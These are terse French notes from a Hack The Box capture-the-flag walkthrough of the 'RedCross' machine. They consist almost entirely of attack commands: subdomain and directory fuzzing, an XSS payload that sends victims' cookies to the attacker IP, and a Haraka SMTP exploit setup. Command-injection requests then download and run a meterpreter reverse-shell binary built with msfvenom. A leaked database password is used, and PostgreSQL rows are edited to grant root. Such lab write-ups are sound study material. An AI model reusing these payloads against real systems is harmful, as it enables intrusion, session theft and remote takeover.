1/ nmaper -i 10.10.10.113 -o nmaper-10.10.10.113

2/ certificat -> penelope@redcross.htb

3/ FUZZ : 
	gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://intra.redcross.htb -k

	gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://intra.redcross.htb/documentation -x pdf,txt -k

	wfuzz -H 'Host: FUZZ.redcross.htb' -u 'https://10.10.10.113' -w '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' --hc 301

4/ Test Web :
	faille web -> page de contact ->
			<script>alert(1)</script>
	Payload : <script>var myimg = new Image(); myimg.src = 'http://10.10.16.6/q?=' + document.cookie;</script>

	On ajoute les cookies :	LANG=EN_US;%20SINCE=1667840531;%20LIMIT=10;%20DOMAIN=admin

	4 users : 
		admin
		penelope
		charles
		guest

	on utile le filtre : 2 parametres disponible :
		https://intra.redcross.htb/?o=2&page=app


5/ Autre sous-domain : admin
	Meme cookies
	white list notre IP
	Creation user ssh :

6/
	nmaper -i 10.10.10.113 -o nmaper-10.10.10.113
-----------------------------------------
USER ACCESS : PENELOPE
7/
	port 1025

On essai ftp, tenet, nc

nc 10.10.10.113
220 redcross ESMTP Haraka 2.8.8 ready

searchsploit haraka

email_from  admin@redcross.htb     yes       Address to send from
email_to    penelope@redcross.htb  yes       Email to send to, must be accepted by the server
rhost       10.10.10.113           yes       Target server
rport       1025                   yes       Target server port

LHOST  192.168.2.28     yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port


-----------------------------------------
ROOT ACCESS :

	port 5432 : postgres

7/ Burpsuite :
	Page ajout IP :
	ip=10.10.10.123;ls&action=deny
	ip=10.10.10.123;cat actions.php&action=deny
			user=unixusrmgr password=dheu%7wjx8B&

	Creation reverse shell :
		msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.6 LPORT=8889 -f elf -o reverse.elf

	Lisener :
		msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost 10.10.16.6; set lport 8889; exploit"

	ip=127.0.0.1;cd /tmp;wget http://10.10.16.6/reverse.elf&id=15&action=deny
	ip=127.0.0.1;cd /tmp;ls -al&id=15&action=deny
	ip=127.0.0.1;cd /tmp;chmod 777 reverse.elf&id=15&action=deny
	ip=127.0.0.1;cd /tmp;./reverse.elf&id=15&action=deny

	Connexion Postgresql :
		psql -h 127.0.0.1 -d unix -U unixusrmgr
		\dt
		select * from passwd_table;
		update passwd_table set gid=0 where username='illumdir';
		update passwd_table set homedir='/home' where username='illumdir';

8/ Connexion ssh :
	ssh illumdir@10.10.10.113

	id
	cat /root/root.txt XXXX
	cat /etc/shudoer
	cat /etc/group | grep sudo >>>> 27

9/ Retour POSTGRES
	psql -h 127.0.0.1 -d unix -U unixusrmgr
	\dt
	select * from passwd_table;
	update passwd_table set gid=27 where username='illumdir';

10/ SSH
	sudo su
	get Flag
	
